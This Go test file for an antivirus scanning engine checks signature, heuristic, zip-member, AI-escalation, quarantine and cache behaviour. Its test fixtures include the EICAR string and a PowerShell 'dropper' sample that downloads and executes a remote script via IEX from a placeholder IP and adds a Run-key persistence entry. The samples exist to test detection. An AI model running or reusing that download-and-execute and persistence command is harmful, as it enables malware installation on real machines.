package engine

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/EoUReDIt/visionary-ai-virus-scanner/internal/config"
	"github.com/EoUReDIt/visionary-ai-virus-scanner/internal/defs"
)

// The test file is assembled at run time so this source file never contains
// the complete EICAR string.
func eicar() []byte {
	return []byte(`X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-` + `ANTIVIRUS-TEST-FILE!$H+H*`)
}

const dropper = "$c = New-Object Net.WebClient\r\npowershell -w hidden -c \"IEX ($c.DownloadString('http://198.51.100.7/a.ps1'))\"\r\n" +
	"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v u /d x.exe\r\n"

func setup(t *testing.T) (*Engine, string) {
	t.Helper()
	t.Setenv("VISIONARY_HOME", t.TempDir())
	db, err := defs.Open()
	if err != nil {
		t.Fatal(err)
	}
	return New(config.Default(), db), t.TempDir()
}

func put(t *testing.T, dir, name string, data []byte) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, data, 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestLayers(t *testing.T) {
	e, dir := setup(t)
	ctx := context.Background()

	if r := e.ScanFile(ctx, put(t, dir, "notes.txt", []byte("meeting at ten")), Options{}); r.Verdict != Clean {
		t.Errorf("plain text: %s %v", r.Verdict, r.Findings)
	}
	r := e.ScanFile(ctx, put(t, dir, "e.com", eicar()), Options{})
	if r.Verdict != Malicious || r.Threat != "EICAR_Test_File" {
		t.Errorf("eicar: %s %s", r.Verdict, r.Threat)
	}
	// Rule (60) plus heuristics lands in the gray zone, not a conviction.
	r = e.ScanFile(ctx, put(t, dir, "update.ps1", []byte(dropper)), Options{})
	if r.Verdict != Suspicious {
		t.Errorf("dropper script: %s score %d %v", r.Verdict, r.Score, r.Findings)
	}
	// Heuristics alone can never convict.
	r = e.ScanFile(ctx, put(t, dir, "invoice.pdf.exe", []byte("not really a program")), Options{})
	if r.Verdict == Malicious || r.Score < 35 {
		t.Errorf("double extension: %s score %d", r.Verdict, r.Score)
	}
	// Archive members are scanned.
	var zb bytes.Buffer
	zw := zip.NewWriter(&zb)
	w, _ := zw.Create("docs/readme.txt")
	w.Write([]byte("hello"))
	w, _ = zw.Create("bin/run.ps1")
	w.Write([]byte(dropper))
	zw.Close()
	r = e.ScanFile(ctx, put(t, dir, "bundle.zip", zb.Bytes()), Options{})
	if r.Verdict != Suspicious || !strings.Contains(r.Findings[0].Detail, "bin/run.ps1") {
		t.Errorf("zip member: %s %v", r.Verdict, r.Findings)
	}
}

func TestEscalationAndAI(t *testing.T) {
	e, dir := setup(t)
	ctx := context.Background()
	p := put(t, dir, "update.ps1", []byte(dropper))

	var seen *Report
	e.AI = func(_ context.Context, rep *Report) (*AIVerdict, error) {
		seen = rep
		return &AIVerdict{Verdict: "malicious", Confidence: 0.95, Reasons: []string{"download cradle"}, Model: "test"}, nil
	}
	if r := e.ScanFile(ctx, p, Options{}); r.AI != nil {
		t.Error("AI must not run without escalation")
	}
	r := e.ScanFile(ctx, p, Options{Escalate: true})
	if r.Verdict != Malicious || seen == nil || seen.FileName != "update.ps1" || seen.Features.Snippet == "" {
		t.Errorf("AI conviction: %s, report %+v", r.Verdict, seen)
	}
	// A confident "benign" clears a heuristic-only file...
	e.AI = func(context.Context, *Report) (*AIVerdict, error) {
		return &AIVerdict{Verdict: "benign", Confidence: 0.9, Model: "test"}, nil
	}
	weird := put(t, dir, "setup.pdf.exe", []byte(strings.Repeat("A", 1600)+" -windowstyle hidden"))
	if r := e.ScanFile(ctx, weird, Options{Escalate: true}); r.Verdict != Clean {
		t.Errorf("AI clearance: %s score %d %v", r.Verdict, r.Score, r.Findings)
	}
	// ...but never overrides a hash hit.
	h := sha256.Sum256(eicar())
	list := put(t, dir, "bad.txt", []byte(hex.EncodeToString(h[:])+"\n"))
	if _, err := defs.Import(list, "bad", "hashes", "", ""); err != nil {
		t.Fatal(err)
	}
	e.DB, _ = defs.Open()
	if r := e.ScanFile(ctx, put(t, dir, "e.com", eicar()), Options{Escalate: true}); r.Verdict != Malicious || r.Threat != "bad" {
		t.Errorf("hash hit: %s %s", r.Verdict, r.Threat)
	}
	// Game mode defers the AI layer.
	e.AI = func(context.Context, *Report) (*AIVerdict, error) { t.Error("AI called in game mode"); return nil, nil }
	e.GameMode = func() bool { return true }
	e.ScanFile(ctx, p, Options{Escalate: true, NoCache: true})
}

func TestQuarantineCacheAllow(t *testing.T) {
	e, dir := setup(t)
	ctx := context.Background()
	p := put(t, dir, "e.com", eicar())
	clean := put(t, dir, "ok.txt", []byte("fine"))

	sum := e.ScanPaths(ctx, []string{dir}, Options{Quarantine: true}, nil)
	if sum.Malicious != 1 || sum.Quarantined != 1 || sum.Clean != 1 || sum.ExitCode() != 1 {
		t.Fatalf("summary %+v", sum)
	}
	if _, err := os.Stat(p); !os.IsNotExist(err) {
		t.Fatal("malicious file still in place")
	}
	items := QuarantineList()
	if len(items) != 1 {
		t.Fatalf("quarantine list %v", items)
	}
	stored, _ := os.ReadFile(filepath.Join(qdir(), items[0].ID+".vq"))
	if bytes.Contains(stored, []byte("EICAR")) {
		t.Error("vault copy is not encoded")
	}
	if r := e.ScanFile(ctx, clean, Options{}); !r.Cached {
		t.Error("clean file was not cached")
	}
	if _, err := QuarantineRestore(items[0].ID, ""); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(p); !bytes.Equal(b, eicar()) {
		t.Error("restored file differs")
	}
	e.Cfg.Allow.Hashes = []string{items[0].SHA256}
	if r := e.ScanFile(ctx, p, Options{Quarantine: true}); r.Verdict != Skipped {
		t.Errorf("allowlisted file: %s", r.Verdict)
	}
	if _, err := QuarantineRestore("../x", ""); err == nil {
		t.Error("path traversal id accepted")
	}
}

func TestLOLBinBehaviorNotDiscounted(t *testing.T) {
	e, dir := setup(t)
	ctx := context.Background()
	p := put(t, dir, "powershell.exe", []byte("clean signed host placeholder"))
	var seen *Report
	e.AI = func(_ context.Context, rep *Report) (*AIVerdict, error) {
		seen = rep
		return &AIVerdict{Verdict: "malicious", Confidence: 0.94, Category: "lolbin", Reasons: []string{"winword spawned encoded powershell"}, Model: "test"}, nil
	}
	r := e.ScanFile(ctx, p, Options{
		Escalate: true,
		Context:  []Finding{{Layer: "behavior", Name: "anomalous-start", Score: 45, Detail: "winword started powershell"}},
		Process:  &ProcessContext{PID: 4242, Parent: "winword", Cmdline: "powershell -w hidden -enc AAA"},
	})
	if r.Verdict != Malicious || seen == nil || seen.Process == nil || seen.Process.Parent != "winword" {
		t.Fatalf("LOLBin triage failed: verdict=%s score=%d seen=%+v", r.Verdict, r.Score, seen)
	}
	if stats := e.AIStats(); stats.Triaged != 1 || stats.Convicted != 1 {
		t.Fatalf("unexpected AI stats: %+v", stats)
	}
}

func TestLargeFileStreamingScan(t *testing.T) {
	e, dir := setup(t)
	// Create a 5 MiB file (> 4 MiB head limit) and verify full-file SHA-256 is
	// computed accurately while content scanning stays bounded to headLimit.
	payload := bytes.Repeat([]byte("A1B2C3D4"), (5<<20)/8)
	want := sha256.Sum256(payload)
	p := put(t, dir, "installer.bin", payload)

	r := e.ScanFile(context.Background(), p, Options{NoCache: true})
	if r.Verdict != Clean {
		t.Fatalf("expected clean, got %s (%v)", r.Verdict, r.Findings)
	}
	if r.SHA256 != hex.EncodeToString(want[:]) {
		t.Fatalf("full-file SHA256 mismatch: got %s want %s", r.SHA256, hex.EncodeToString(want[:]))
	}
	foundPartial := false
	for _, f := range r.Findings {
		if f.Name == "partial-content-scan" {
			foundPartial = true
		}
	}
	if !foundPartial {
		t.Fatalf("expected partial-content-scan note for 5 MiB file, got %v", r.Findings)
	}
}

func TestCacheBoundedEviction(t *testing.T) {
	e, _ := setup(t)
	e.Cfg.Profile = "lite" // 25,000 cap
	e.cacheMu.Lock()
	for i := 0; i < 26000; i++ {
		rev := e.DB.Manifest.Revision
		if i < 500 {
			rev = rev - 1 // stale revision
		}
		e.cache[filepath.Join("f", string(rune(i/1000+65)), strings.Repeat("x", 4)+string(rune(i%1000)))] = cacheEntry{
			Size: 100, Mod: int64(i), Rev: rev,
		}
	}
	// Ensure exact count exceeds cap even if rune keys collide.
	for i := 0; len(e.cache) <= e.cacheMaxEntries()+500; i++ {
		e.cache[filepath.Join("extra", hex.EncodeToString([]byte{byte(i >> 8), byte(i)}))] = cacheEntry{
			Size: 100, Mod: int64(100000 + i), Rev: e.DB.Manifest.Revision,
		}
	}
	e.evictCacheLocked(e.DB.Manifest.Revision)
	got := len(e.cache)
	e.cacheMu.Unlock()
	if got > e.cacheMaxEntries() {
		t.Fatalf("cache size %d exceeds cap %d", got, e.cacheMaxEntries())
	}
}
